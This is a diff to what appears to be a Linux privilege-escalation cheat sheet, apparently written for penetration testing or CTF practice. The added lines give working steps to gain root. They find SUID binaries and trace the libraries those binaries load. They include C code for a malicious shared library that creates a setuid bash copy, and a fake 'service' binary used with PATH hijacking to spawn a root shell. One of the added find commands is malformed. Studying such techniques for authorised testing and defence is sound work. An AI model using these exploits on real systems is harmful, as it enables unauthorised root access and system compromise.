@@ -304,6 +304,7 @@ find all the file that have suid privilege
 
 ```
 $ find / -perm -u=s -type f 2>/dev/null
+$ find / -type f -perm -04000 ls 2>/dev/null
 ```
 
 after find your command that have SUID go to [Gtfobins](https://gtfobins.github.io) and search about
@@ -311,7 +312,6 @@ if you are lucky find and done
 
 for example my SUID set command is ```systemctl``` so read gtfobins blog and find this :
 ```
-
 TF=$(mktemp).service
 echo '[Service]
 Type=oneshot
@@ -323,6 +323,74 @@ WantedBy=multi-user.target' > $TF
 ```
 so line by line execiute in the command line and done, we got that.
 
+## sub tools
+
+sometime is not Enough to find a file that have SUID set and we need more thing like what library or sub tools the command  is using
+for this purpose. so we need this execiute this command :
+```
+strace <name file that have SUID set> 2>&1 | grep -i -E "open|access|no such file"
+```
+when you find that what library or sub tools is use , just need to write a C code and compiled after that replaced so when program with suid is run be also executed this library that we write be .
+
+```
+// C program 
+#include <stdlib.h>
+#include <stdio.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+```
+save this and compile it with :
+```
+gcc -shared -fPIC -o <repleaced file path that find> <path to program file>
+```
+and that have root access 
+
+also, I suggest you see [ CVE-2016-1247 ](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html) nginexed bug
+
+environment variable 
+
+when you find some command that has suid and with ```strace ``` can't find anything after trying to find what command that executed with :
+```
+string /path/to/example
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+service apache2 start 
+```
+here we find a service command that executed after run ```example```  and we know that have suid bit so what happens if we create a tool with  ```service``` name and replaced with, let's see it :)
+
+```
+// new service command to replase with environment variable 
+int main() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+and compile it
+```
+gcc /tmp/service.c -o /tmp/service 
+```
+so after that just need to change the PATH variable and run example command 
+```
+$ export PATH=/tmp:$PATH
+$ /path/to/example/command
+```
+if you not see any error so that's mean successfully done
 
 
 
